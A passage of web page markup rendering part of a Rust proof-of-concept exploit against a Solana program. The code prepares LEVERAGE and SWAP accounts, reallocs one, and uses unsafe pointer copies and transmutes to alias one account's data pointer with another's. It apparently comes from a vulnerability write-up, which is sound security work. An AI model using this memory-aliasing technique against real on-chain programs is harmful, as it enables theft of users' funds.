token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _instruction_data\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"8\"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" swap_idx \"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[24]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" pointer_idx \"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement184\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[25]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement187\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" leverage_idx \"]}],[\"$\",\"span\",\"code-segement189\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement190\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement191\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"6\"]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[26]}],\"\\n\",[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Prepare LEVERAGE and SWAP accounts to set up memory layout\"]}],[\"$\",\"span\",\"code-segement199\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[28]}],[\"$\",\"span\",\"code-segement201\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}],[\"$\",\"span\",\"code-segement202\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement203\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement204\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement205\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement207\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement208\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement209\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement212\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement213\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement215\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement217\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement218\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement219\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}],[\"$\",\"span\",\"code-segement222\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement223\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement224\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement225\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement226\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement228\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement229\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement230\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement231\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement232\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement233\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement234\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement235\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement236\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement237\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement238\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement239\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[30]}],\"\\n\",[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement243\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement244\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE to simplify exploit logic\"]}],[\"$\",\"span\",\"code-segement245\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[32]}],[\"$\",\"span\",\"code-segement247\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        accounts\"]}],[\"$\",\"span\",\"code-segement248\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement249\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement250\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement251\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement252\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}],[\"$\",\"span\",\"code-segement253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement254\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement255\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement257\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement258\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement259\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement260\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement261\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[33]}],\"\\n\",[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[34]}],[\"$\",\"span\",\"code-segement265\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement266\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Overwrite SWAP's data pointer with LEVERAGE's pointer\"]}],[\"$\",\"span\",\"code-segement267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[35]}],[\"$\",\"span\",\"code-segement269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement270\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement271\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement272\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement273\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[36]}],[\"$\",\"span\",\"code-segement275\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement276\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}],[\"$\",\"span\",\"code-segement277\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement278\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"copy\"]}],[\"$\",\"span\",\"code-segement279\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement280\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[37]}],[\"$\",\"span\",\"code-segement282\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement283\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement284\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement285\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segement286\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement287\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement288\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement289\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement290\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement291\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement292\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement293\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement294\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement295\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement296\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement297\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement298\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement299\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement300\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement302\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement303\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement304\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement305\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement306\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement307\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement308\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement310\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement311\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement313\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement314\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement315\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement316\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement317\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[38]}],[\"$\",\"span\",\"code-segement319\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement320\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement321\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement322\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segement323\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement324\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement325\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement326\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement327\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement328\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement329\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement330\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement331\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement332\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement333\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement334\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement335\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement336\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement337\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement338\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement339\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement340\",{\"className\":\"token 